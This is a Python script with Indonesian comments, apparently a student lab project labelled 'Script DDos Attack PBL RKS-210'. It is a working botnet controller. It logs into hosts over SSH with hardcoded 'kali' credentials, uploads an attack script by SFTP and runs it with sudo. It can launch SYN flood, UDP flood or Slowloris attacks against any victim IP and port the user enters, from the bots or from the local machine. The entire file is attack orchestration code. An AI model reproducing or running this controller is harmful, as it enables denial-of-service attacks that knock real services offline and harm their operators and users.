import paramiko
import threading
import sys
import subprocess
import time
from termcolor import colored

# BANNER OOTD
title = colored('''

 (    (                                             
 )\ ) )\ )             (        )   )            )  
(()/((()/(             )\    ( /(( /(   )     ( /(  
 /(_))/(_))  (  (   ((((_)(  )\())\()| /(  (  )\()) 
(_))_(_))_   )\ )\   )\ _ )\(_))(_))/)(_)) )\((_)\  
 |   \|   \ ((_|(_)  (_)_\(_) |_| |_((_)_ ((_) |(_) 
 | |) | |) / _ (_-<   / _ \ |  _|  _/ _` / _|| / /  
 |___/|___/\___/__/  /_/ \_\ \__|\__\__,_\__||_\_\  
                                                    
STARTING DDOS ATTACK 
Script DDos Attack PBL RKS-210
''', 'red', attrs=['bold'])

# Fungsi untuk menjalankan command terminal local
def subprocess_dos(command):
    return subprocess.run(command, shell=True)

# list host yang akan digunakan untuk DDOS
hosts = [
    {'ip': '192.168.2.2', 'port': 22, 'username': 'kali', 'password': 'kali'},
    {'ip': '192.168.2.3', 'port': 22, 'username': 'kali', 'password': 'kali'},
    {'ip': '192.168.2.4', 'port': 22, 'username': 'kali', 'password': 'kali'},
    {'ip': '192.168.2.5', 'port': 22, 'username': 'kali', 'password': 'kali'},
]

hosts_yang_tersedia = []

# Fungsi untuk menghubungkan ke host dan menjalankan perintah menggunakan ssh
def run_command_on_host(host, port, username, password, command):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(host, port=port, username=username, password=password)
    
    # membuka koneksi dan file pada direktori botnet
    sftp = ssh_client.open_sftp()

    # memasukkan file zip ke botnet, sehingga pastikan pada Master Control mempunyai file attack pada dir yang sama dengan Program CLI
    try:
        print("\n...sedang mengirim program DDOS pada botnet...")
        sftp.put('attack_script.py', f'/home/{username}/Desktop/attack_script.py')
        sftp.close()
        print("\nFile telah terkirim")
        time.sleep(1)

        # Mengolah command untuk botnet
        prefix_command = f"export DISPLAY=:0.0; cd Desktop; echo '{password}' | sudo -S"
        command_add = f"{prefix_command} {command}"
        
        # assign com_add ke variable baru karena exec_command tidak menerima formatted string
        full_command = command_add
        
        # membuat chanel shell interaktif
        channel = ssh_client.invoke_shell()

        # mengeksekusi command untuk setiap botnet
        channel.send(full_command + "\n")

        print(title)
        # Mengambil nilai stop_attack dari variabel bersama
        stop_attack = input(f"\n\nHOST = ({host} : {username})\nApakah anda ingin menghentikan serangan? \n[Y/n]? ").lower()

        if stop_attack == "y":
            cmd_stop = f"echo '{password}' | sudo -S killall python3"
            full_command_stop = cmd_stop

            channel.send(full_command_stop + "\n")    

            # menutup sesi shell
            channel.close() 
            # menuutp sesi ssh
            ssh_client.close()

        elif stop_attack == "n": 
            print("\nserangan akan tetap dilanjutkan...")
            sys.exit()
        else:
            print("\ninvalid Input!!!")
            sys.exit()

    except Exception as e:
        print(f"Error Pada SSH: \nError : {e}")
        # Program akan berhenti jika terjadi error 
        sys.exit()
  


# Function untuk melakukan serangan DDOS
def serangan_botnet(jumlah_host: int):
    # Menghapus beberapa host dari hosts berdasarkan jumlah botnet yang diinginkan
    hosts_yang_tersedia = hosts[:jumlah_host]
    
    # list jenis serangan
    tipe_serangan_valid = ['syn', 'udp', 'slowloris']
    
    # memilih tip eserangan
    input_pilih_serangan = input("Pilih Jenis Serangan!... \n[syn / udp / slowloris]?: ").lower()
    if input_pilih_serangan not in tipe_serangan_valid:
        print("Invalid attack type")
    
    elif input_pilih_serangan == "syn": 
        target_ip = input("Masukkan IP address korban: ")
        port = int(input("Masukkan port yang ingin anda serang: "))
        attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))
        
        com_syn = f"python3 attack_script.py syn {target_ip} {port} --to {attack_duration}"
        command = com_syn

    elif input_pilih_serangan == "udp":
        target_ip = input("Masukkan IP address korban: ")
        port = int(input("Masukkan port yang ingin anda serang: "))
        time_pause = float(input("(Jumlah delay setiap pengiriman packet, satuan detik, cth = 0.05): "))
        attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))
        
        com_udp = f"python3 attack_script.py udp {target_ip} {port} --s {time_pause} --to {attack_duration}"
        command = com_udp

    elif input_pilih_serangan == "slowloris":
        target_ip = input("Masukkan IP address korban: ")
        port = int(input("Masukkan port yang ingin anda serang: "))
        total_requests = int(input("Masukkan total Request (satuan unit, cth = 1000): "))
        attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))
        
        com_slow = f"python3 attack_script.py slowloris {target_ip} {port} --ts {total_requests} --to {attack_duration}"
        command = com_slow

    # Membuat thread untuk setiap host
    try:
        threads = []
        for host in hosts_yang_tersedia:
            t = threading.Thread(target=run_command_on_host, args=(host['ip'], host['port'], host['username'], host['password'], command))
            t.start()
            threads.append(t)

        # Menunggu thread selesai
        for t in threads:
            t.join()
    except Exception as e:
        print(f"{e}")



# memulai program
try:
    input_metode = input("Pilihlah Service yang ingin digunakan!..(DOS/DDOS): ").upper()
    
    if input_metode == "DDOS":
        try :    
            input_botnet = int(input(f"Masukkan jumlah botnet yang ingin dipakai!... \nBerikut jumlah botnet yang tersedia (Hosts = {len(hosts)}): "))
            if input_botnet > len(hosts) or input_botnet == 0:
                print("Invalid Botnet Amount")
            else:
                try:
                    serangan_botnet(input_botnet)
                except TypeError:
                    print("\nInput Harus Berupa Angka")

        except:
            print("\nSSH pada botnet tidak terkoneksi atau Command pada SSH tidak berhasil dijalankan!!!")
            sys.exit()
    
    elif input_metode == "DOS":
        try:
            pilih_serangan_dos = int(input("Pilih serangan!!!. Ketik (1) untuk SYN Flood, ketik (2) untuk UDP Flood, (3) untuk Slowloris: "))
            
            if pilih_serangan_dos == 1:
                target_ip = input("Masukkan IP address korban: ")
                port = int(input("Masukkan port yang ingin anda serang: "))
                attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))

                pass_masterCNC = input("Masukkan Password OS: ")
                cmd_syn = f"export DISPLAY=:0.0; cd Desktop; echo '{pass_masterCNC}' | sudo -S python3 attack_script.py syn {target_ip} {port} --to {attack_duration}"

                try:
                    run_syn = subprocess_dos(cmd_syn)
                except Exception as e:
                    print(f"Subprocess Error: {e}")
                finally:
                    stop_attack = input("\n\n\nApakah anda ingin menghentikan serangan? \n[Y/n]? ").lower()
                    if stop_attack == "y":
                        cmd_stop = f"echo {pass_masterCNC} | sudo -S killall python3"
                        subprocess_dos(cmd_stop)
                    elif stop_attack == "n": 
                        print("\nserangan akan tetap dilanjutkan...")
                    else:
                        print("Invalid Input!!!")

            elif pilih_serangan_dos == 2:                
                target_ip = input("Masukkan IP address korban: ")
                port = int(input("Masukkan port yang ingin anda serang: "))
                time_pause = float(input("(Jumlah delay setiap pengiriman packet, satuan detik, cth = 0.05): "))
                attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))
                    
                cmd_udp = f"export DISPLAY=:0.0; cd Desktop; python3 attack_script.py udp {target_ip} {port} --s {time_pause} --to {attack_duration}"

                try:
                    run_udp = subprocess_dos(cmd_udp)
                except Exception as e:
                    print(f"Subprocess Error: {e}")
                finally:
                    stop_attack = input("\n\n\nApakah anda ingin menghentikan serangan? \n[Y/n]? ").lower()
                    if stop_attack == "y":
                        cmd_stop = "killall python3"
                        subprocess_dos(cmd_stop)
                    elif stop_attack == "n": 
                        print("\nserangan akan tetap dilanjutkan...")
                    else:
                        print("Invalid Input!!!")


            elif pilih_serangan_dos == 3 :
                target_ip = input("Masukkan IP address korban: ")
                port = int(input("Masukkan port yang ingin anda serang: "))
                total_requests = int(input("Masukkan total Request (satuan unit, cth = 1000): "))
                attack_duration = int(input("masukkan durasi serangan (satuan detik, cth = 10): "))
                
                cmd_slowloris = f"export DISPLAY=:0.0; cd Desktop; python3 attack_script.py slowloris {target_ip} {port} --ts {total_requests} --to {attack_duration}"

                try: 
                    run_slowloris = subprocess_dos(cmd_slowloris)
                except Exception as e:
                    print(f"Subprocess Error: {e}")
                finally:
                    stop_attack = input("\n\n\nApakah anda ingin menghentikan serangan? \n[Y/n]? ").lower()
                    if stop_attack == "y":
                        cmd_stop = "killall python3"
                        subprocess_dos(cmd_stop)
                    elif stop_attack == "n": 
                        print("\nserangan akan tetap dilanjutkan...")
                    else:
                        print("Invalid Input!!!")
                        
        except Exception as e:
            print(f"Error Output DOS Attack: \n{e}")

    else:
        print("\nInvalid Service Input!!!")

except:
    print("\nInvalid Choose type Service")
